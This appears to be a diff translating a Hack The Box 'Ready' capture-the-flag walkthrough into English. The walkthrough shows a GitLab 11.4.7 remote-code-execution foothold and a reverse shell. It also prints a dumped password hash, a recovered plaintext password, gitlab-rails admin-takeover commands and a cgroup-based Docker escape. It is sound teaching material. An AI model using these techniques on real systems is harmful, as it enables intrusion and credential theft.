@@ -1,6 +1,6 @@
 ---
 title: 'Walktrough: HTB Ready'
-language: pt-BR
+language: en-US
 localeid: htb-ready
 date: 2021-05-15T16:00:00.000Z
 tags:
@@ -15,20 +15,20 @@ authors:
   - default
 ---
 
-Olá pessoal!
+Hello guys!
 
-A máquina desta semana será **Ready**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu), criada por [bertolis](https://app.hackthebox.eu/users/27897).
+This week's machine will be **Ready**, another median-rated machine from [Hack The Box](https://www.hackthebox.eu), created by [bertolis](https://app.hackthebox.eu/users/27897).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
+\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they're retired.
 \[info]
 
 ![HTB Ready](https://i.imgur.com/QV6d376.png)
 
-Esta máquina foi bem interessante sua resolução, onde exploramos uma versão vulnerável do GitLab Server e na sequência precisamos escapar do container docker para obter a flag de root.
+This machine had a very interesting resolution, where we'll exploit a vulnerable version of GitLab Server and then escape the docker container to obtain the root flag.
 
-## Enumeração
+## Enumeration
 
-Como de costume, iniciamos com a enumeração rápida do `nmap` para identificar os serviços publicados nesta máquina:
+As usual, we start with a `nmap` quick scan, to identify the services currently published on this machine:
 
 ```bash
 $ nmap -sC -sV -Pn -oA quick 10.10.10.220
@@ -57,17 +57,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
 ```
 
-### 5080/TCP - Serviço HTTP
+### 5080/TCP - HTTP Service
 
-Conforme pode ser visto no resultado do `nmap` se trata de um serviço GitLab Community. Similar à máquina <Link href="/blog/2021/04/htb-laboratory">Laboratory</Link>, segui com a criação de uma nova conta para verificar a versão do servidor e eventuais projetos públicos disponíveis.
+As we can see in `nmap` output, a GitLab Server Community is running. Similar to [Laboratory](/en-US/blog/2021/04/htb--laboratory), proceeded with an account creation to have access to public repositories in this server that could help us proceed in this box.
 
-Após criada a conta, pude comprovar que a versão em execução é a **11.4.7**, conforme podemos ver na imagem abaixo.
+After account creation, no repository was found but noticed that the running GitLab Server version was **11.4.7**, as we can see in the image below.
 
 ![Gitlab Version](https://i.imgur.com/2ChxfMw.png)
 
 ## Initial Foothold
 
-Realizando uma busca rápida no `searchsploit`, identificadas algumas versões de exploit para a versão de GitLab Server identificada.
+After a quick search on `searchsploit` for the listed version, identified some available exploits that could be used.
 
 ```bash
 $ searchsploit gitlab 11.4.7
@@ -81,7 +81,7 @@ GitLab 11.4.7 - Remote Code Execution (Authenticated)                    | ruby/
 Shellcodes: No Results
 ```
 
-Utilizando o último exploit listado (49334.py) notei que não possuía a opção de fornecer a porta do GitLab Server (vide output abaixo), assim como existe um erro nos parâmetros para recebimento do shell reverso onde foi necesário alterar o parametro `local_port` para `local_port = args.P`.
+Using the last result (49334.py), noticed that it didn't allowed us to set the service port, which required some edit, as well as an issue in the payload generation, where was necessary to update the parameter `local_port` to `local_port = args.P`.
 
 ```bash
 $ python3 49334.py -h                                                                
@@ -98,23 +98,23 @@ optional arguments:
   -P P        reverse shell port
 ```
 
-Adicionalmente, foi necessário alterar o payload utilizado pelo script, que apenas realizava a conexão via `nc` no endereço e portas especificados, mas nao exportava o `/bin/sh`, impedindo a interação com a máquina.
+Also, was necessary to change the payload used, once it wasn't exporting the shell in `nc` session, preventing us from interacting with the machine.
 
-Após ajustes, obtido shell com a conta **git** no diretório `~/gitlab-rails/working`
+After these changes, obtained a reverse shell as user **git** in the directory `~/gitlab-rails/working`
 
 ## User flag
 
-Após shell inicial, iniciada enumeração fazendo uso do `linenum.sh`, onde os seguintes pontos chamaram atenção:
+After initial shell, started enumeration using `linenum.sh`, where the following details called attention:
 
-* Execução dentro de container docker, possivelmente sendo necessário futuramente escapar deste para o host.
-* Existe usuário local `dude` (id=1000), no qual o arquivo `user.txt` encontra-se em seu home directory.
-* Obtido hash de contas do GitLab Server, onde o usuário `root` é o único privilegiado, possuindo o seguinte hash de senha:
+* App execution inside a docker container, being necessary to escape to the host later.
+* There's a local user `dude` (id=1000), where the user flag `user.txt` resides in his home directory.
+* Obtained the GitLab Server credentials dump, where the user `root` is the only one with privileges, which has the password hash below:
 
 | username | e-mail                                         | admin | hash                                                         |
 | -------- | ---------------------------------------------- | ----- | ------------------------------------------------------------ |
 | root     | [admin@example.com](mailto\:admin@example.com) | true  | $2a$10$zzun9kmrHMdwsJZKTmwn9OZddFjwrhbaXx3b2eb9l2g.1LrjZo0V2 |
 
-Com base nas informações acima, ao validar os privilégios necessários para ler o arquivo `user.txt`, identificado que o usuário corrente (`git`), possuía acesso, logo obtivemos a flag de usuário.
+Based on the information above, first thing tried was to check the required privileges to read `user.txt`, where we identified that `git` user had access, so we've collected it.
 
 ```bash
 git@gitlab:/home/dude$ ls -la
@@ -132,18 +132,18 @@ git@gitlab:/home/dude$ cat user.txt
 
 ## Root flag
 
-O próximo passo seria obter a flag de root. Tendo o hash de senha, conforme observado via enumeração do LinEnum poderíamos realizar o cracking dele usando algum dicionário, porém em buscas realizadas sobre este hash em sites da internet não resultaram em nada, logo deixei essa opção para o final, caso não encontre outro modo.
+Next step would be obtaining the root credential to read the `root.txt` flag. As we had his password hash would be easy to crack it or search in internet but, as this task consumes lot of time and resources, decided to skip this for now as this hash wasn't still publicly known.
 
-Durante a enumeração do LinEnum, o seguinte texto é listado junto da listagem das contas:
+During the enumeration, the information was also shared along with the credential dump:
 
 > If you have enough privileges, you can make an account under your control administrator by running: gitlab-rails runner 'user = User.find\_by(email: "[youruser@example.com](mailto\:youruser@example.com)"); user.admin = TRUE; user.save!'
 > Alternatively, you could change the password of any user by running: gitlab-rails runner 'user = User.find\_by(email: "[admin@example.com](mailto\:admin@example.com)"); user.password = "pass\_peass\_pass"; user.password\_confirmation = "pass\_peass\_pass"; user.save!'
 
-Com base nesta informação, segui para o reset da senha do usuário root conforme recomendado, porém nenhum repositório privado ou informação adicional foi encontrada, que pudesse auxiliar na obtenção das credenciais de root.
+Based on that, proceeded with the root account password reset as recommended, but no private repository or additional information was found, that could help us succeed on obtaining root's credentials.
 
-Uma vez que nao encontrei nenhum processo ou informação para o usuário dude e crackear a senha com base no hash identificado não era uma opção rápida, segui para a enumeração manual, onde acabei encontrando um diretório `/opt/backup`, que continha diversos arquivos.
+That said, decided to perform a manual enumeration and, looking for backups in the file system, found a directory `/opt/backup/`, that contained several files inside it.
 
-Buscando neste diretório por palavras chaves como `passwd`, `password`, encontrei uma entrada que chamou atenção no arquivo `/opt/backup/gitlab.rb`, conforme podemos ver abaixo dentre as linhas comentadas e em branco, removidas utilizando o comando `grep` listado
+Performing an `grep` search on it looking for passwords (`passwd`, `password`, `pwd`), found an entry that called attention on `/opt/backup/gitlab.rb`, as we can see in the output below, after removing commented and blank lines.
 
 ```bash
 git@gitlab:/opt/backup$ cat /opt/backup/gitlab.rb | grep -Ev '^#|^$'
@@ -151,7 +151,7 @@ gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
 git@gitlab:/opt/backup$
 ```
 
-Com a senha encontrada, testado para o usuário `root`, o que confirmou a validade da credencial, porém no diretório raiz deste usuário **não existe um arquivo `root.txt`**, o que indica que precisaremos escapar do container e obter a flag a partir do host docker.
+With this credential, tested it for the user `root` and succeeded, but in root's home path **there was no `root.txt`**, indicating that we'll need to escape the container to obtain the root's flag.
 
 ```bash
 git@gitlab:/opt/backup$ su root
@@ -169,11 +169,11 @@ drwx------ 2 root root 4096 Dec  7 16:49 .ssh
 root@gitlab:/opt/backup#
 ```
 
-### Escapando do container
+### Escaping container
 
-Uma vez que temos privilégios de root, se o container estiver rodando sob circunstâncias especificas, podemos escapar do mesmo para o host, conforme encontrei a partir de uma pesquisa e extremamente bem documentado no blog [Understanding Docker container escapes | Trail of Bits Blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).
+Once we have privileged access inside the container, if it is running under specific circunstancies, we can escape to the host as was very well documented in this blog post [Understanding Docker container escapes | Trail of Bits Blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/), found after some research in this scenario.
 
-Seguindo o passo-a-passo descrito neste blog, criado um listener na porta 4443 TCP na máquina atacante e realizados os seguintes procedimentos com o usuário `root` no container, obtendo assim um shell reverso.
+Following the step-by-step described on it, created a listener in 4443 TCP in attacker machine and executed the following steps using root privileges, obtaining this way a reverse shell.
 
 ```bash
 # In the container
@@ -190,7 +190,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-Com a conexão recebida, confirmado que estávamos dentro do host executando o comando `docker ps` e, na sequência, obtido a flag de root.
+In the received connection, confirmed that we were in the host running `docker ps` command and then obtained the root flag.
 
 ```bash
 $ nc -lnvp 4443
@@ -206,6 +206,6 @@ CONTAINER ID        IMAGE                          COMMAND             CREATED  
 <redacted>
 ```
 
-Espero que tenham gostado.
+I hope you guys have enjoyed.
 
-Vejo vocês no próximo post! \:smile:
+See you in the next post! \:smile:
